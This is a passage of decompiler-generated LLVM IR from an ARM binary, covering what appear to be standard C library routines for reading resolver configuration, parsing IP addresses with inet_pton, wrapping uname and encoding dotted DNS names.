  %v2_19fc4 = load i32, i32* %v1_19fc4, align 4
  store i32 %v2_19fc4, i32* @r1, align 4
  %v3_19fcc = call i32 @__GI_strcoll(i8* %v2_19fcc, i32 %v2_19fc4)
  %v2_19fd0 = icmp eq i32 %v3_19fcc, 0
  br i1 %v2_19fd0, label %dec_label_pc_1a000, label %dec_label_pc_1a0a0

dec_label_pc_19fdc:                               ; preds = %dec_label_pc_19fe8.preheader, %dec_label_pc_19fdc.dec_label_pc_19fe8_crit_edge
  %v2_19fe830 = phi i32 [ %v2_19fe8, %dec_label_pc_19fdc.dec_label_pc_19fe8_crit_edge ], [ %v2_19fe826, %dec_label_pc_19fe8.preheader ]
  %v3_19fdc = call i32 @__GI_strcasecmp(i8* %v2_19fcc, i32 %v2_19fe830)
  %v2_19fe0 = icmp eq i32 %v3_19fdc, 0
  br i1 %v2_19fe0, label %dec_label_pc_1a000, label %dec_label_pc_19fdc.dec_label_pc_19fe8_crit_edge

dec_label_pc_19fdc.dec_label_pc_19fe8_crit_edge:  ; preds = %dec_label_pc_19fdc
  %v0_19fe8.pre = load i32, i32* @r4, align 4
  %v1_19fe8 = inttoptr i32 %v0_19fe8.pre to i32*
  %v2_19fe8 = load i32, i32* %v1_19fe8, align 4
  store i32 %v2_19fe8, i32* %r3.global-to-local, align 4
  store i32 %v2_19fe8, i32* %r1.global-to-local, align 4
  %v2_19fec = icmp eq i32 %v2_19fe8, 0
  %v1_19ff4 = add i32 %v0_19fe8.pre, 4
  store i32 %v1_19ff4, i32* @r4, align 4
  br i1 %v2_19fec, label %dec_label_pc_1a0a0, label %dec_label_pc_19fdc

dec_label_pc_1a000:                               ; preds = %dec_label_pc_19fdc, %dec_label_pc_19fc4
  %v0_1a000 = load i32, i32* @r5, align 4
  %v1_1a000 = inttoptr i32 %v0_1a000 to i32*
  %v2_1a000 = load i32, i32* %v1_1a000, align 4
  store i32 %v2_1a000, i32* %r3.global-to-local, align 4
  %v4_1a000 = add i32 %v0_1a000, 4
  store i32 %v4_1a000, i32* @r5, align 4
  %v2_1a004 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1a004, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_1a00c = load i32, i32* @r7, align 4
  %v2_1a00c = inttoptr i32 %v1_1a00c to i32*
  store i32 %v2_1a000, i32* %v2_1a00c, align 4
  %v0_1a010 = load i32, i32* @lr, align 4
  %v1_1a010 = load i32, i32* @ip, align 4
  %v2_1a010 = add i32 %v1_1a010, 4
  %v3_1a010 = inttoptr i32 %v2_1a010 to i32*
  store i32 %v0_1a010, i32* %v3_1a010, align 4
  store i32 %tmp6, i32* %r2.global-to-local, align 4
  %v0_1a018 = load i32, i32* @r8, align 4
  %v7_1a018 = icmp eq i32 %v0_1a018, 2
  %v0_1a01c = load i32, i32* @r5, align 4
  %v1_1a01c = load i32, i32* @r7, align 4
  %v2_1a01c = add i32 %v1_1a01c, 4
  %v3_1a01c = inttoptr i32 %v2_1a01c to i32*
  store i32 %v0_1a01c, i32* %v3_1a01c, align 4
  %v0_1a020 = load i32, i32* @ip, align 4
  %v1_1a020 = load i32, i32* @r7, align 4
  %v2_1a020 = add i32 %v1_1a020, 16
  %v3_1a020 = inttoptr i32 %v2_1a020 to i32*
  store i32 %v0_1a020, i32* %v3_1a020, align 4
  %v0_1a024 = load i32, i32* @sl, align 4
  %v1_1a024 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a024 = add i32 %v1_1a024, 24
  %v3_1a024 = inttoptr i32 %v2_1a024 to i32*
  store i32 %v0_1a024, i32* %v3_1a024, align 4
  br i1 %v7_1a018, label %dec_label_pc_1a02c, label %dec_label_pc_1a05c

dec_label_pc_1a02c:                               ; preds = %dec_label_pc_1a000
  %v3_1a02c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1a02c, i32* %r3.global-to-local, align 4
  %v0_1a030 = load i32, i32* @r8, align 4
  %v1_1a034 = inttoptr i32 %v3_1a02c to i32*
  %v2_1a034 = load i32, i32* %v1_1a034, align 4
  store i32 %v2_1a034, i32* %r1.global-to-local, align 4
  %v0_1a038 = load i32, i32* @sl, align 4
  store i32 %v0_1a038, i32* %r2.global-to-local, align 4
  %v3_1a03c = inttoptr i32 %v2_1a034 to i8*
  %v4_1a03c = call i32 @inet_pton(i32 %v0_1a030, i8* %v3_1a03c, i32 %v0_1a038)
  %tmp23 = icmp slt i32 %v4_1a03c, 1
  br i1 %tmp23, label %dec_label_pc_1a09c, label %dec_label_pc_1a048

dec_label_pc_1a048:                               ; preds = %dec_label_pc_1a02c
  %v0_1a04c = load i32, i32* @r7, align 4
  %v2_1a04c = inttoptr i32 %tmp7 to i32*
  store i32 %v0_1a04c, i32* %v2_1a04c, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_1a054 = load i32, i32* @r8, align 4
  %v1_1a054 = load i32, i32* @r7, align 4
  %v2_1a054 = add i32 %v1_1a054, 8
  %v3_1a054 = inttoptr i32 %v2_1a054 to i32*
  store i32 %v0_1a054, i32* %v3_1a054, align 4
  %v0_1a094.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a090

dec_label_pc_1a05c:                               ; preds = %dec_label_pc_1a000
  %v0_1a05c = load i32, i32* @r8, align 4
  %v7_1a05c = icmp eq i32 %v0_1a05c, 10
  br i1 %v7_1a05c, label %dec_label_pc_1a064, label %dec_label_pc_1a09c

dec_label_pc_1a064:                               ; preds = %dec_label_pc_1a05c
  %v3_1a064 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1a064, i32* %r3.global-to-local, align 4
  %v1_1a06c = inttoptr i32 %v3_1a064 to i32*
  %v2_1a06c = load i32, i32* %v1_1a06c, align 4
  store i32 %v2_1a06c, i32* %r1.global-to-local, align 4
  %v0_1a070 = load i32, i32* @sl, align 4
  store i32 %v0_1a070, i32* %r2.global-to-local, align 4
  %v3_1a074 = inttoptr i32 %v2_1a06c to i8*
  %v4_1a074 = call i32 @inet_pton(i32 10, i8* %v3_1a074, i32 %v0_1a070)
  %tmp24 = icmp slt i32 %v4_1a074, 1
  br i1 %tmp24, label %dec_label_pc_1a09c, label %dec_label_pc_1a080

dec_label_pc_1a080:                               ; preds = %dec_label_pc_1a064
  store i32 %tmp7, i32* @ip, align 4
  %v0_1a084 = load i32, i32* @r8, align 4
  %v1_1a084 = load i32, i32* @r7, align 4
  %v2_1a084 = add i32 %v1_1a084, 8
  %v3_1a084 = inttoptr i32 %v2_1a084 to i32*
  store i32 %v0_1a084, i32* %v3_1a084, align 4
  %v0_1a088 = load i32, i32* @r7, align 4
  %v1_1a088 = load i32, i32* @ip, align 4
  %v2_1a088 = inttoptr i32 %v1_1a088 to i32*
  store i32 %v0_1a088, i32* %v2_1a088, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a090

dec_label_pc_1a090:                               ; preds = %dec_label_pc_1a048, %dec_label_pc_1a080
  %v0_1a094 = phi i32 [ %v0_1a094.pre, %dec_label_pc_1a048 ], [ 16, %dec_label_pc_1a080 ]
  store i32 0, i32* @sb, align 4
  %v1_1a094 = load i32, i32* @r7, align 4
  %v2_1a094 = add i32 %v1_1a094, 12
  %v3_1a094 = inttoptr i32 %v2_1a094 to i32*
  store i32 %v0_1a094, i32* %v3_1a094, align 4
  br label %dec_label_pc_1a0c4

dec_label_pc_1a09c:                               ; preds = %dec_label_pc_1a05c, %dec_label_pc_1a064, %dec_label_pc_1a02c
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_1a0a0

dec_label_pc_1a0a0:                               ; preds = %dec_label_pc_19fe8.preheader, %dec_label_pc_19fdc.dec_label_pc_19fe8_crit_edge, %dec_label_pc_19fc4, %dec_label_pc_1a09c, %dec_label_pc_19f54
  %v0_1a0a0 = load i32, i32* @r6, align 4
  store i32 %v2_19f5c, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_19f90, i32* %r3.global-to-local, align 4
  %v4_1a0b0 = inttoptr i32 %v0_1a0a0 to i32*
  %v5_1a0b0 = call i32 @__GI_config_read(i32* %v4_1a0b0, i32 %v2_19f5c, i32 459270, i32 %v0_19f90)
  %v2_1a0b4 = icmp eq i32 %v5_1a0b0, 0
  br i1 %v2_1a0b4, label %dec_label_pc_1a0bc, label %dec_label_pc_19fa4

dec_label_pc_1a0bc:                               ; preds = %dec_label_pc_1a0a0
  %v0_1a0bc = load i32, i32* @fp, align 4
  %v7_1a0bc = icmp eq i32 %v0_1a0bc, 1
  br i1 %v7_1a0bc, label %dec_label_pc_1a0cc, label %dec_label_pc_1a0c4

dec_label_pc_1a0c4:                               ; preds = %dec_label_pc_1a0bc, %dec_label_pc_1a090
  %v0_1a0c4 = load i32, i32* @r6, align 4
  %v1_1a0c8 = inttoptr i32 %v0_1a0c4 to i32*
  %v2_1a0c8 = call i32 @__GI_config_close(i32* %v1_1a0c8)
  br label %dec_label_pc_1a0cc

dec_label_pc_1a0cc:                               ; preds = %dec_label_pc_19fa4, %.thread, %dec_label_pc_1a0bc, %dec_label_pc_19f40, %dec_label_pc_1a0c4
  %v0_1a0cc = load i32, i32* @sb, align 4
  store i32 %v3_19ee4, i32* @r4, align 4
  store i32 %v6_19ee4, i32* @r5, align 4
  store i32 %v9_19ee4, i32* @r6, align 4
  store i32 %v12_19ee4, i32* @r7, align 4
  store i32 %v15_19ee4, i32* @r8, align 4
  store i32 %v18_19ee4, i32* @sb, align 4
  store i32 %v21_19ee4, i32* @sl, align 4
  store i32 %v24_19ee4, i32* @fp, align 4
  ret i32 %v0_1a0cc

; uselistorder directives
  uselistorder i32 %v2_19fe8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_19fe8.pre, { 1, 0 }
  uselistorder i32 %v0_19f90, { 1, 0 }
  uselistorder i32 %v2_19f5c, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 3, 2, 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6, 10, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 5, 0, 1, 2, 3, 7, 4, 6 }
  uselistorder i32 (i32*)* @__GI_config_close, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 10, { 4, 38, 40, 41, 1, 11, 45, 48, 49, 50, 29, 30, 13, 12, 5, 52, 51, 42, 14, 53, 15, 54, 16, 55, 56, 2, 33, 17, 34, 18, 19, 20, 39, 9, 0, 43, 44, 21, 58, 46, 47, 35, 36, 22, 37, 23, 10, 31, 32, 8, 7, 3, 57, 24, 6, 26, 27, 25, 28, 59 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 18, 19, 20, 21, 22, 23, 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 24, { 64, 68, 70, 71, 0, 82, 13, 18, 1, 54, 72, 73, 41, 42, 43, 44, 19, 69, 83, 2, 76, 77, 78, 20, 65, 66, 55, 21, 67, 22, 45, 46, 23, 47, 24, 25, 26, 3, 27, 28, 29, 30, 74, 75, 14, 31, 4, 79, 32, 33, 34, 36, 35, 37, 5, 6, 7, 56, 57, 58, 59, 60, 61, 62, 63, 48, 80, 38, 81, 39, 49, 50, 51, 52, 53, 15, 16, 40, 10, 9, 17, 8, 11, 12, 84 }
  uselistorder i32 -48, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 48, { 5, 38, 24, 6, 35, 36, 25, 26, 27, 28, 0, 1, 30, 7, 31, 32, 2, 8, 33, 9, 39, 10, 40, 41, 42, 11, 13, 12, 14, 37, 3, 15, 34, 16, 18, 29, 17, 19, 20, 21, 22, 23, 4 }
  uselistorder i32 34, { 7, 8, 9, 10, 2, 3, 0, 5, 11, 4, 12, 6, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_26934.581 to i32), { 95, 67, 68, 69, 96, 3, 4, 70, 97, 1, 98, 99, 100, 101, 102, 103, 71, 72, 104, 105, 26, 106, 9, 11, 6, 7, 10, 5, 8, 107, 12, 73, 108, 109, 110, 13, 74, 111, 112, 14, 15, 113, 16, 114, 17, 115, 18, 116, 75, 117, 76, 118, 19, 20, 119, 77, 120, 121, 122, 123, 124, 125, 36, 35, 37, 126, 27, 61, 57, 55, 54, 56, 58, 59, 60, 53, 62, 48, 50, 49, 47, 46, 51, 52, 43, 42, 45, 44, 41, 40, 39, 38, 79, 63, 78, 64, 65, 80, 127, 2, 82, 81, 83, 21, 128, 22, 84, 85, 129, 87, 130, 131, 132, 133, 23, 134, 89, 88, 34, 31, 32, 33, 30, 24, 66, 29, 86, 90, 135, 91, 136, 25, 137, 138, 28, 139, 92, 140, 0, 93, 94 }
  uselistorder i32* @fp, { 36, 37, 38, 39, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 0, 62, 72, 73, 74, 75, 76, 77, 78, 79, 80, 5, 6, 81, 82, 1, 83, 84, 85, 86, 40, 41, 42, 43, 44, 45, 46, 47, 2, 58, 59, 60, 61, 132, 134, 133, 135, 116, 117, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 63, 64, 65, 66, 67, 68, 69, 70, 71, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 3, 31, 32, 33, 34, 35, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 136, 137, 138, 139, 140, 141, 142, 149, 150, 148, 143, 144, 145, 146, 147, 4 }
  uselistorder i32* @sl, { 30, 31, 32, 33, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 55, 56, 57, 58, 59, 0, 60, 1, 61, 62, 63, 64, 65, 66, 67, 68, 69, 9, 10, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 34, 35, 36, 37, 38, 6, 7, 11, 12, 49, 50, 51, 52, 53, 54, 84, 85, 86, 2, 87, 88, 89, 90, 91, 92, 94, 3, 93, 96, 95, 97, 98, 99, 100, 80, 81, 82, 83, 13, 14, 15, 16, 17, 18, 19, 4, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 5, 8 }
  uselistorder i32* @sb, { 17, 18, 19, 20, 25, 26, 27, 28, 29, 30, 43, 31, 32, 33, 2, 34, 71, 72, 3, 73, 74, 75, 76, 77, 78, 79, 6, 7, 8, 80, 81, 82, 83, 84, 85, 86, 21, 22, 23, 24, 35, 36, 37, 38, 39, 40, 41, 42, 89, 92, 90, 91, 93, 87, 88, 9, 10, 11, 12, 13, 14, 15, 0, 16, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 1, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 4, 5 }
  uselistorder i32* @r8, { 36, 37, 38, 39, 40, 41, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 65, 68, 69, 70, 71, 72, 73, 3, 74, 75, 76, 77, 78, 79, 13, 14, 15, 80, 81, 82, 83, 84, 85, 86, 87, 88, 42, 43, 44, 45, 16, 17, 18, 7, 8, 4, 9, 60, 61, 5, 62, 63, 64, 91, 92, 93, 94, 95, 6, 96, 97, 98, 99, 100, 101, 102, 103, 89, 90, 66, 67, 19, 20, 0, 21, 26, 27, 28, 29, 30, 31, 2, 32, 1, 33, 34, 35, 10, 11, 57, 58, 22, 23, 24, 25, 12 }
  uselistorder label %dec_label_pc_1a0cc, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1a0a0, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_1a09c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1a090, { 1, 0 }
  uselistorder label %dec_label_pc_19fdc, { 1, 0 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a0e8 = load i32, i32* @r7, align 4
  store i32 %v3_1a0e8, i32* %stack_var_-8, align 4
  %v0_1a0f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a0f4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a0f4, -4095
  br i1 %tmp, label %dec_label_pc_1a114, label %dec_label_pc_1a104

dec_label_pc_1a104:                               ; preds = %entry
  %v0_1a104 = call i32 @__GI___errno_location()
  %v0_1a108 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a108 = sub i32 0, %v0_1a108
  %v2_1a10c = inttoptr i32 %v0_1a104 to i32*
  store i32 %v1_1a108, i32* %v2_1a10c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1a114.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1a114

dec_label_pc_1a114:                               ; preds = %entry, %dec_label_pc_1a104
  %v1_1a118 = phi i32 [ %v0_1a0f4, %entry ], [ -1, %dec_label_pc_1a104 ]
  %v2_1a114 = phi i32 [ %v3_1a0e8, %entry ], [ %v2_1a114.pre, %dec_label_pc_1a104 ]
  store i32 %v2_1a114, i32* @r7, align 4
  ret i32 %v1_1a118

; uselistorder directives
  uselistorder i32 %v0_1a0f4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 ()* @__GI___errno_location, { 51, 50, 35, 48, 47, 46, 45, 85, 84, 83, 20, 40, 34, 58, 82, 81, 78, 49, 33, 57, 56, 80, 79, 77, 76, 75, 74, 5, 42, 60, 17, 9, 73, 8, 23, 7, 16, 15, 14, 44, 43, 72, 71, 70, 41, 13, 12, 67, 22, 32, 31, 59, 11, 26, 29, 61, 28, 55, 54, 53, 69, 38, 37, 6, 2, 4, 39, 66, 10, 68, 0, 52, 3, 24, 65, 25, 30, 64, 63, 62, 19, 1, 18, 36, 27, 21 }
  uselistorder i32* @r7, { 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 151, 152, 153, 154, 155, 156, 157, 158, 165, 166, 167, 168, 169, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 22, 23, 24, 25, 0, 26, 2, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 78, 4, 79, 80, 81, 27, 28, 29, 30, 31, 32, 33, 34, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 82, 1, 83, 84, 85, 86, 5, 170, 171, 120, 6, 121, 122, 123, 124, 125, 126, 35, 36, 41, 42, 43, 44, 37, 38, 39, 40, 45, 46, 47, 48, 271, 272, 76, 77, 241, 242, 232, 233, 49, 234, 230, 231, 273, 274, 275, 276, 281, 282, 7, 17, 18, 50, 51, 3, 52, 15, 53, 54, 243, 244, 249, 250, 251, 252, 253, 254, 255, 245, 246, 247, 248, 159, 160, 161, 162, 163, 164, 256, 257, 258, 259, 260, 261, 262, 263, 8, 264, 265, 266, 217, 218, 267, 268, 226, 227, 69, 70, 221, 222, 16, 223, 9, 224, 225, 87, 88, 89, 90, 91, 92, 93, 10, 177, 178, 172, 11, 173, 174, 175, 14, 176, 55, 12, 56, 57, 179, 13, 180, 181, 94, 95, 100, 101, 19, 20, 96, 97, 98, 99, 102, 103, 104, 105, 148, 149, 150, 235, 236, 279, 280, 58, 59, 269, 270, 106, 107, 277, 278, 228, 229, 60, 61, 219, 220, 62, 63, 64, 65, 66, 67, 68, 237, 238, 239, 240, 71, 72, 73, 74, 75, 21 }
  uselistorder label %dec_label_pc_1a114, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_1a11c = load i32, i32* @r4, align 4
  store i32 %v3_1a11c, i32* %stack_var_-32, align 4
  %v6_1a11c = load i32, i32* @r5, align 4
  %v9_1a11c = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1a124 = load i32, i32* @r1, align 4
  store i32 %v0_1a124, i32* %r8.global-to-local, align 4
  %v0_1a128 = load i32, i32* @r2, align 4
  store i32 %v0_1a128, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a19023 = icmp slt i8* %arg1, null
  store i1 %v1_1a19023, i1* %cpsr_n.global-to-local, align 1
  %v2_1a19024 = icmp eq i8* %arg1, null
  store i1 %v2_1a19024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a19024, label %dec_label_pc_1a1a8, label %dec_label_pc_1a19c

dec_label_pc_1a134:                               ; preds = %dec_label_pc_1a19c
  %v2_1a134 = call i32 @__GI_strchr(i32 %v0_1a13426, i32 46)
  store i32 %v2_1a134, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a138 = icmp slt i32 %v2_1a134, 0
  store i1 %v1_1a138, i1* %cpsr_n.global-to-local, align 1
  %v2_1a138 = icmp eq i32 %v2_1a134, 0
  store i1 %v2_1a138, i1* %cpsr_z.global-to-local, align 1
  %v0_1a13c = load i32, i32* @r4, align 4
  %v2_1a13c = sub i32 %v2_1a134, %v0_1a13c
  store i32 %v2_1a13c, i32* @r5, align 4
  br i1 %v2_1a138, label %dec_label_pc_1a144, label %dec_label_pc_1a150

dec_label_pc_1a144:                               ; preds = %dec_label_pc_1a134
  %v1_1a144 = inttoptr i32 %v0_1a13c to i8*
  %v3_1a148 = call i32 @strlen(i8* %v1_1a144)
  %sext = mul i32 %v3_1a148, 16777216
  %v1_1a14c = sdiv i32 %sext, 16777216
  store i32 %v1_1a14c, i32* @r5, align 4
  %v0_1a15c.pre = load i32, i32* @r4, align 4
  %v0_1a16c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1a150

dec_label_pc_1a150:                               ; preds = %dec_label_pc_1a134, %dec_label_pc_1a144
  %v0_1a16c = phi i32 [ %v2_1a134, %dec_label_pc_1a134 ], [ %v0_1a16c.pre, %dec_label_pc_1a144 ]
  %v0_1a15c = phi i32 [ %v0_1a13c, %dec_label_pc_1a134 ], [ %v0_1a15c.pre, %dec_label_pc_1a144 ]
  %v0_1a17c = phi i32 [ %v2_1a13c, %dec_label_pc_1a134 ], [ %v1_1a14c, %dec_label_pc_1a144 ]
  %v0_1a150 = load i32, i32* %sl.global-to-local, align 4
  %v1_1a150 = add i32 %v0_1a150, 1
  store i32 %v1_1a150, i32* %r7.global-to-local, align 4
  %v1_1a154 = load i32, i32* %sb.global-to-local, align 4
  %v2_1a154 = sub i32 %v1_1a154, %v0_1a150
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a158 = icmp slt i32 %v0_1a17c, 0
  store i1 %v1_1a158, i1* %cpsr_n.global-to-local, align 1
  %v2_1a158 = icmp eq i32 %v0_1a17c, 0
  store i1 %v2_1a158, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1a15c, i32* @r1, align 4
  %v0_1a160 = load i32, i32* %r8.global-to-local, align 4
  %v2_1a160 = add i32 %v0_1a160, %v1_1a150
  store i32 %v2_1a160, i32* @r0, align 4
  store i32 %v0_1a17c, i32* @r2, align 4
  %v1_1a168 = add i32 %v2_1a154, -1
  store i32 %v1_1a168, i32* @r3, align 4
  %v1_1a16c = add i32 %v0_1a16c, 1
  store i32 %v1_1a16c, i32* @r4, align 4
  br i1 %v2_1a158, label %dec_label_pc_1a1bc, label %dec_label_pc_1a174

dec_label_pc_1a174:                               ; preds = %dec_label_pc_1a150
  %v2_1a174 = sub i32 %v0_1a17c, %v1_1a168
  %v3_1a174 = icmp ult i32 %v0_1a17c, %v1_1a168
  %v4_1a174 = xor i32 %v1_1a168, %v0_1a17c
  %v5_1a174 = xor i32 %v2_1a174, %v0_1a17c
  %v6_1a174 = and i32 %v5_1a174, %v4_1a174
  %v7_1a174 = icmp slt i32 %v6_1a174, 0
  store i1 %v7_1a174, i1* %cpsr_v.global-to-local, align 1
  %v8_1a174 = icmp slt i32 %v2_1a174, 0
  store i1 %v8_1a174, i1* %cpsr_n.global-to-local, align 1
  %v9_1a174 = icmp eq i32 %v0_1a17c, %v1_1a168
  store i1 %v9_1a174, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1a174, label %dec_label_pc_1a17c, label %dec_label_pc_1a1bc

dec_label_pc_1a17c:                               ; preds = %dec_label_pc_1a174
  %v1_1a17c = trunc i32 %v0_1a17c to i8
  %v4_1a17c = add i32 %v0_1a160, %v0_1a150
  %v5_1a17c = inttoptr i32 %v4_1a17c to i8*
  store i8 %v1_1a17c, i8* %v5_1a17c, align 1
  %v0_1a180 = call i32 @memcpy()
  store i32 %v0_1a180, i32* @r0, align 4
  %v0_1a184 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a184 = icmp slt i32 %v0_1a184, 0
  store i1 %v1_1a184, i1* %cpsr_n.global-to-local, align 1
  %v2_1a184 = icmp eq i32 %v0_1a184, 0
  store i1 %v2_1a184, i1* %cpsr_z.global-to-local, align 1
  %v0_1a188 = load i32, i32* @r5, align 4
  %v1_1a188 = load i32, i32* %r7.global-to-local, align 4
  %v2_1a188 = add i32 %v1_1a188, %v0_1a188
  store i32 %v2_1a188, i32* %sl.global-to-local, align 4
  br i1 %v2_1a184, label %dec_label_pc_1a1a8, label %dec_label_pc_1a17c.dec_label_pc_1a190_crit_edge

dec_label_pc_1a17c.dec_label_pc_1a190_crit_edge:  ; preds = %dec_label_pc_1a17c
  %v0_1a190.pre = load i32, i32* @r4, align 4
  store i32 %v0_1a190.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a190 = icmp slt i32 %v0_1a190.pre, 0
  store i1 %v1_1a190, i1* %cpsr_n.global-to-local, align 1
  %v2_1a190 = icmp eq i32 %v0_1a190.pre, 0
  store i1 %v2_1a190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a190, label %dec_label_pc_1a1a8, label %dec_label_pc_1a19c

dec_label_pc_1a19c:                               ; preds = %entry, %dec_label_pc_1a17c.dec_label_pc_1a190_crit_edge
  %v0_1a13426 = phi i32 [ %v0_1a190.pre, %dec_label_pc_1a17c.dec_label_pc_1a190_crit_edge ], [ %tmp, %entry ]
  %v5_1a1b0525 = phi i32 [ %v2_1a188, %dec_label_pc_1a17c.dec_label_pc_1a190_crit_edge ], [ 0, %entry ]
  %v1_1a19c = inttoptr i32 %v0_1a13426 to i8*
  %v2_1a19c = load i8, i8* %v1_1a19c, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a1a0 = icmp eq i8 %v2_1a19c, 0
  store i1 %v2_1a1a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a1a0, label %dec_label_pc_1a1a8, label %dec_label_pc_1a134

dec_label_pc_1a1a8:                               ; preds = %dec_label_pc_1a17c.dec_label_pc_1a190_crit_edge, %dec_label_pc_1a17c, %dec_label_pc_1a19c, %entry
  %v8_1a1b4 = phi i32 [ 0, %entry ], [ %v5_1a1b0525, %dec_label_pc_1a19c ], [ %v2_1a188, %dec_label_pc_1a17c ], [ %v2_1a188, %dec_label_pc_1a17c.dec_label_pc_1a190_crit_edge ]
  %v0_1a1a8 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a1a8 = icmp slt i32 %v0_1a1a8, 0
  store i1 %v1_1a1a8, i1* %cpsr_n.global-to-local, align 1
  %v2_1a1a8 = icmp eq i32 %v0_1a1a8, 0
  store i1 %v2_1a1a8, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_1a1a8, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_1a1a8
  %v6_1a1b0 = add i32 %v8_1a1b4, 1
  store i32 %v6_1a1b0, i32* @r0, align 4
  %v7_1a1b4 = load i32, i32* %r8.global-to-local, align 4
  %v9_1a1b4 = add i32 %v7_1a1b4, %v8_1a1b4
  %v10_1a1b4 = inttoptr i32 %v9_1a1b4 to i8*
  store i8 0, i8* %v10_1a1b4, align 1
  %v0_1a1b8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1a1b8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1a1b8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_1a1a8, %bb
  %v2_1a1b8 = phi i1 [ %v2_1a1b8.pre, %bb ], [ false, %dec_label_pc_1a1a8 ]
